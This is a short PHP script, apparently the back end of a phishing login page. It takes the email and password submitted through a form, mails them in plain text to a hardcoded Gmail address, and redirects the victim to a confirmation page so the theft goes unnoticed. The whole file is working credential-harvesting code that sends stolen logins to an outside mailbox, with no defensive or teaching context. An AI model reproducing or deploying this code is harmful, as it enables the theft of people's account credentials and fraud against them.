<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $correo = $_POST['correo'];
    $contrasena = $_POST['contrasena'];
    
    $destinatario = "ezequieldelacruz10102@gmail.com";
    $asunto = "Nuevo inicio de sesión";
    $mensaje = "Correo electrónico: $correo\nContraseña: $contrasena";
    
    // Envía el correo electrónico
    mail($destinatario, $asunto, $mensaje);
    
    // Redirige al usuario a una página de confirmación
    header("Location: confirmacion.html");
    exit();
}
?>